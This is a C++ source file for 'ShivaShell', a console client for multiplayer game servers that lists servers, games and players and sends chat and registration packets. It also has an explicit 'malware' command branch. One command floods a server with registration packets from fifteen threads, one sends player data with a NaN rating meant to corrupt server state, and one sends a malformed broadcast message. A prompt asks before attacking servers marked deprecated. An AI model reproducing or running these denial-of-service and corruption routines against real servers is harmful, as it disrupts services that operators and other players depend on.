#include "ShivaShell.h"

ServerData passemblosMainData;

unsigned int maskSend2Everyone = 0xffffffff & ~(1 << (ServerConnector::globalStationID - 1));

void ShivaShell::run()
{
	init();
	while (!abortSession) {
		tick();
	}
}

void ShivaShell::init()
{
	inputPacketsStream.init();
	audioUtil.init();
	loadPredefServers();
	initPassemblosTemplate();
	
	fFile helpTextFile("data/helpText.txt", fFile::AS_INPUT);
	helpText = helpTextFile.fileData;

	std::cout
		<< "SHIVASHELL::v0x0\n"
		<< "Enter '.help' to print shell help.\n";

}

void ShivaShell::tick()
{
	std::cout << '>';
	parseCommand(getCommand());
	ServerConnector::processPacketStack();
}

void ShivaShell::initPassemblosTemplate()
{
	passemblosMainData.GameType = PASSEMBLOSS;

	passemblosMainData.Passembloss.ArtefactsUsing = 0;
	passemblosMainData.Passembloss.CheckpointsNumber = INT_MAX;
	passemblosMainData.Passembloss.Color = 0;
	passemblosMainData.Passembloss.InEscaveTime = INT_MAX;
	passemblosMainData.Passembloss.InitialCash = INT_MAX;
	passemblosMainData.Passembloss.RandomEscave = 0;
}

void ShivaShell::loadPredefServers()
{
	PredefServersConfigParser configParser;

	configParser.parse(predefServers);
}

std::string ShivaShell::getCommand()
{
	std::string commline;
	std::getline(std::cin, commline);
	return commline;
}

void ShivaShell::parseCommand(const std::string& commline)
{
	std::string word;

	commlineParser.myData = commline;
	commlineParser.currentPos = 0;

	while (commlineParser.tryReadWord(word)) {
		routeCmdName(word);
	}
}

#define cmdcase(cmdstr, cmdfnc) if(cmd == cmdstr) { cmdfnc(); break; }

void ShivaShell::routeCmdName(std::string& cmd)
{
	int i, j;

	char prefix = cmd[0];
	cmd.erase(0, 1);

	for (char &c : cmd) {
		c = std::tolower(c);
	}

	switch (prefix) {
	default:
		std::cout << "Unknown command branch prefix: " << prefix << '\n';
		break;
	case '.': // global
		cmdcase("help", dc_Help);
		cmdcase("shtd", dc_Shtd);
		cmdcase("abrt", dc_Abrt);
		cmdcase("pstdmp", dc_Pstdmp);
		cmdcase("mtaux", dc_Mtaux);
		cmdcase("mtaud", dc_Mtaud);

		std::cout << "Unknown global command: " << cmd << '\n';
		break;
	case 's': // server
		cmdcase("cn", dcScn);
		cmdcase("dc", dcSdc);
		cmdcase("st", dcSst);
		cmdcase("gl", dcSgl);
		cmdcase("map", dcSmap);

		std::cout << "Unknown server command: " << cmd << '\n';
		break;
	case 'g': // game
		cmdcase("cn", dcGcn);
		cmdcase("pl", dcGpl);
		cmdcase("reg", dcGreg);
		cmdcase("ms", dcGms);

		std::cout << "Unknown game command: " << cmd << '\n';
		break;
	case 'm': // malware
		cmdcase("gnn", dcMgnn);
		cmdcase("nni", dcMnni);
		cmdcase("cmp", dcMcmp);
		cmdcase("msi", dcMmsi);

		std::cout << "Unknown malware command: " << cmd << '\n';
		break;
	}
}

bool ShivaShell::malwareCheckServer()
{
	switch (currentState) {
	case ShivaState::Calm:
	case ShivaState::Attack:
		if (predefCurrentInfo) {
			if (predefCurrentInfo->flags & PDSF_Deprecated) {
				audioUtil.set(TID_DprAttackIntro);

				std::cout
					<< "WARNING::You are trying to use malware at deprecated server.\n"
					<< "Are you sure? [y/n]: ";

				char answer;
				std::cin >> answer;

				if (answer == 'y' || answer == 'Y') {
					currentState = DprAttack;
					audioUtil.set(TID_DprAttackMain);
					return 1;
				}
				audioUtil.set(TID_Calm);
				return 0;
			}
			if(currentState != Attack) {
				currentState = Attack;
				audioUtil.set(TID_NormalAttack);
			}
		}
		return 1;
	case ShivaState::DprAttack:
		return 1;
	}
	
	return 0;
}

// mass packet thread
namespace mpt {
	int numStartThreads = 0;
	int numCurrentThreads = 0;
}

#define REQARG(argname) if(!(commlineParser.tryReadAny(argname))) { std::cout<<"command failed - no "#argname" arg\n"; return; }                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    

void ShivaShell::dc_Help()
{
	std::cout << helpText << '\n';
}

void ShivaShell::dc_Shtd() 
{
	abortSession = 1;
}

void ShivaShell::dc_Abrt() 
{
	std::abort();
}

void ShivaShell::dc_Pstdmp()
{
	std::cout << "size=" << inputPacketsStream.packetStack.size() << '\n';

	std::string strnum;
	for (VPacket& packet : inputPacketsStream.packetStack) {
		std::cout << "- [" << packet.size() << "]{";
		
		for (const char& byte : packet) {

			strnum = std::to_string((int)byte);
			for (int j = 3; j > strnum.size(); j--) {
				strnum.insert(strnum.begin(), '0');
			}

			std::cout << strnum << ',';
		}
		std::cout << "}\n";
	}
}

void ShivaShell::dc_Mtaux()
{
	std::string isMutedArg;

	REQARG(isMutedArg);

	bool isMuted = atoi(isMutedArg.data());

	ServerConnector::muteAuxPackets = isMuted;
}

void ShivaShell::dc_Mtaud()
{
	std::string isMutedArg;

	REQARG(isMutedArg);

	bool isMuted = atoi(isMutedArg.data());

	if(isMuted){
		audioUtil.stream.pause();
	}
	else{
		audioUtil.stream.play();
	}
}

void ShivaShell::dcScn()
{
	ServerInfo connectInfo;
	std::string word;

	REQARG(connectInfo.IP);

	if (commlineParser.tryReadAny(word)) {
		connectInfo.Port = atoi(word.c_str());
	}
	else {
		connectInfo.Port = 2197;
	}

	predefCurrentInfo = 0;

	if (ServerConnector::connect(connectInfo)) {

		for (PredefServerInfo& predefServ : predefServers) {
			if (predefServ.name == connectInfo.IP && predefServ.port == connectInfo.Port) {
				predefCurrentInfo = &predefServ;
				break;
			}
		}

		std::cout << "connected...\n";
		return;
	}

	std::cout << "connection failed!\n";
}

void ShivaShell::dcSdc()
{
	ServerConnector::disconnect();
	std::cout << "disconnected...\n";
}

#define PRINT_SERVER_PRM(prm) std::cout<<#prm"="<<ServerConnector::prm<<'\n';

void ShivaShell::dcSst()
{
	std::cout << "server connector status:\n";
	PRINT_SERVER_PRM(isConnected);
	if (ServerConnector::isConnected) {
		PRINT_SERVER_PRM(targetServer.IP);
		PRINT_SERVER_PRM(targetServer.Port);
		std::cout << "targetServer->realIP=" << mainSocket.getRemoteAddress() << '\n';
	}

}
void ShivaShell::dcSgl()
{

	std::cout << "updating...\n";
	ServerConnector::updateGamesList();
	std::cout << "updated\n";

	if (ServerConnector::gamesList.empty()) {
		std::cout << "<no any>\n";
		return;
	}

	for (const GameInfo& gameInfo : ServerConnector::gamesList) {

		std::cout	<< "-+-NAME------>" << gameInfo.name << '\n'
					<< " +-ID-------->" << gameInfo.ID << '\n';

	}
}


void ShivaShell::dcSmap()
{
	ServerConnector::disconnect();

	ServerInfo connectInfo;

	std::cout << "DEFAULT SERVERS MAP\n";

	sf::Clock pingClock;
	for (PredefServerInfo& predefserver : predefServers) {
		if (predefserver.flags & PDSF_Deprecated)
			std::cout << '\t' << "[DEPRECATED]\n";
		std::cout
			<< '\t' << "name: " << predefserver.name << ':' << std::to_string(predefserver.port) << '\n'
			<< '\t' << "engine: " << predefserver.engine << '\n'
			<< '\t' << "host: " << predefserver.host << '\n'
			<< '\t' << "description: '" << predefserver.description << "'\n";

		connectInfo.IP = predefserver.name;
		connectInfo.Port = predefserver.port;

		pingClock.restart();

		bool state = ServerConnector::connect(connectInfo, 0);

		std::cout
			<< '\t' << "connection state: " << (state ? "+" : "-") << '\n'
			<< '\t' << "ping: " << pingClock.restart().asSeconds()<<'s' << '\n';

		std::cout << '\n';
	}
}

void ShivaShell::dcGcn()
{
	std::string gameIDArg;
	int gameID;
	
	REQARG(gameIDArg);

	gameID = atoi(gameIDArg.data());

	if (!ServerConnector::connect2Game(gameID)) {
		std::cout << "connection failed...\n";
		return;
	}
	std::cout << "connected\n";
}

void ShivaShell::dcGpl()
{
	bool printBody = 0;
	std::string printBodyArg;

	commlineParser.tryReadAny(printBodyArg);

	printBody = atoi(printBodyArg.data());

	ServerConnector::updatePlayersList();

	if (ServerConnector::playersList.empty()) {
		std::cout << "<no any>\n";
		return;
	}

	for (PlayerInfo& player : ServerConnector::playersList) {
		std::cout
			<< "-+-NAME----->" << player.name << '\n'
			<< " +-ID------->" << (int)player.ID << '\n'
			<< " +-STATUS--->" << (int)player.status << '\n'
			<< " +-WORLDID-->" << (int)player.worldID << '\n'
			<< " +-POSITION->" << player.X << ", " << player.Y << '\n';

		if (printBody) {
			std::cout
				<< " +-BODY-+-BEEBOS--->" << player.body.beebos << '\n'
				<< "        +-KILLS---->" << (int)player.body.kills << '\n'
				<< "        +-DEATHS--->" << (int)player.body.deaths << '\n'
				<< "        +-COLOR---->" << (int)player.body.color << '\n'
				<< "        +-NETID---->" << player.body.NetID << '\n'
				<< "        +-CARINDEX->" << (int)player.body.CarIndex << '\n'
				<< "        +-WORLD---->" << (int)player.body.world << '\n'
				<< "        +-RATING--->" << player.body.rating << '\n';
		}
	}
}

void ShivaShell::dcGreg()
{
	VPacket registerPacket(REGISTER_NAME);
	std::string name, password;

	REQARG(name);
	REQARG(password);

	registerPacket += name + '\0';
	registerPacket += password + '\0';

	registerPacket.sendToServer();
}

void ShivaShell::dcGms()
{
	VPacket messagePacket(DIRECT_SENDING);
	messagePacket.writeAny(maskSend2Everyone);

	std::string text;

	REQARG(text);

	messagePacket += text + '\0';
	messagePacket.sendToServer();
}

VPacket massSendPacket;
sf::Time massSendDelay = sf::seconds(0.001f);

void sendFunc() {
	for (int i = 0; i < 100; i++) {
		massSendPacket.sendToServer();
		sf::sleep(massSendDelay);
	}
}

void ShivaShell::dcMgnn()
{
	if (!malwareCheckServer()) return;

	if (massSendPacket.empty()) {
		massSendPacket.type = REGISTER_NAME;
	}

	for (int i = 0; i < 0xf; i++) {
		std::thread(sendFunc).detach();
	}
}

void ShivaShell::dcMnni()
{
	if (!malwareCheckServer()) return;

	VPacket sendBodyPacket(SET_PLAYER_DATA);

	PlayerBody myBody;
	myBody.rating = std::nanf("");

	sendBodyPacket.writeAny(myBody);

	sendBodyPacket.sendToServer();


}

void ShivaShell::dcMcmp()
{
	massSendPacket.clear();
}

void ShivaShell::dcMmsi()
{
	if (!malwareCheckServer()) return;

	VPacket messagePacket(DIRECT_SENDING);
	messagePacket.writeAny(maskSend2Everyone);
	/*
	for (int i = 0; i < 400; i++) {
		messagePacket += ' ';
	}
	messagePacket += '\0';
	*/
	messagePacket.sendToServer();
}

